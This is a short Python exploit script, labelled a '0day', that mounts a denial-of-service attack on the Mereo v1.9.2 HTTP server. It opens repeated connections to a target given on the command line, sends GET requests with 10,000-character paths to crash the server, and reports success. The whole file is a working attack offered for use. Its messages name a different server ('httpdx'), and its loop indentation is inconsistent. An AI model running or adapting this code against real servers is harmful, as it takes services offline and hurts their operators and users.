#!/usr/bin/python
 
###########################################################################
#
# Title:    Mereo v1.9.2 Remote HTTP Server DoS (0day)
# By:       CwG GeNiuS
# Email:    cwggenius [at] gmail [dot] com
# Tested:   XPSP3
# Download: http://www.ohloh.net/p/mereo
#
############################################################################
 
 
import socket, sys
  
payload ="GET /";
payload+="X" * 10000;
payload+=" HTTP/1.1\r\n\r\n";
count = 1;
  
try:
    while (count < 100):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print ("[*] Connecting to httpdx server.");
            s.connect((sys.argv[1], 80));
            print ("\n[*] Sending command.\n");
            s.send(payload);
            s.close();
        count = count+1;
        print count;
except:
    print "Successfully Crashed!";
